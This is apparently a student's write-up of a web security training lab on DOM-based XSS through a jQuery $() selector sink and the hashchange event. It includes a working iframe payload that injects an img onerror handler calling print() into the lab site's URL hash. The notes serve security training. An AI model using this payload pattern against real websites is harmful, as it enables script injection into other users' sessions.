# [XSS] DOM XSS in jQuery selector sink using a hashchange event (1)

[XSS] **Lab: DOM XSS in jQuery selector sink using a hashchange event**

---

![Untitled](%5BXSS%5D%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hash%20ab6378c7664a4b3c9756aa87fc75094a/Untitled.png)

using firebug lite we can filter to view scripts. 

![Untitled](%5BXSS%5D%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hash%20ab6378c7664a4b3c9756aa87fc75094a/Untitled%201.png)

like this one: 

![Untitled](%5BXSS%5D%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hash%20ab6378c7664a4b3c9756aa87fc75094a/Untitled%202.png)

![Untitled](%5BXSS%5D%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hash%20ab6378c7664a4b3c9756aa87fc75094a/Untitled%203.png)

---

 for this challenge since we can see the website is use the $() jquery selector but that paired with the location.hash and hashchange allows us to provide script and input in URL. 

but to deliver our payload we need our exploit server…   

so this is the payload: 

```jsx
<iframe src="https://0a53002903e232bd8295a61400390049.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=window.print()>'">
```

**NOTE: we can use window.print() or print()**

![Untitled](%5BXSS%5D%20DOM%20XSS%20in%20jQuery%20selector%20sink%20using%20a%20hash%20ab6378c7664a4b3c9756aa87fc75094a/Untitled%204.png)